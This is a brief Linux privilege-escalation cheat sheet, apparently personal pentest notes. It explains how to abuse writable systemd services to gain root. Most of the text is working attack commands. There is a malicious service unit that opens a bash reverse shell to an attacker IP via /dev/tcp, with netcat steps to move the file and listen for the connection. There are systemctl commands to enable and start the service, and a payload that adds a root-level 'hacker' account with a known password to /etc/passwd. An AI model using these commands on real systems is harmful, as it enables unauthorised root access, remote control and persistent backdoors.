#linux #priviledgeEscalation 

1. Find the services using below command or linpeas
```bash
find / -writable -type d 2>/dev/null | grep -Fv -e "/home/cmeeks" -e "/proc/" -e "/sys/"
```
and
```bash
find / -writable -type f 2>/dev/null | grep -Fv -e "/home/cmeeks" -e "/proc/" -e "/sys/"
```

2. Either configure a new service or  edit the existing one 

### Adding a new service 

```bash
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

###### Init the target listening the port

```
nc -vl 44444 > root.service
```

###### Send file to traget

```
nc -n TargetIP 44444 < root.service
```

###### Start listening

```
nc -lvnp 9999
```
##### Execute the payload(assume the file is under /dev/shm)

```
/bin/systemctl enable /dev/shm/root.service
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /dev/shm/root.service
Created symlink from /etc/systemd/system/root.service -> /dev/shm/root.service
```

```
/bin/systemctl start root
```
### Modify the existing one

1. add the shell payload and user root to below parameters
```bash
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'
```

2.  Restart the service or the machine while listening in 9999 port.


### Adding a root user

```bash
User=root
ExecStart=/bin/bash -c 'echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd'
```


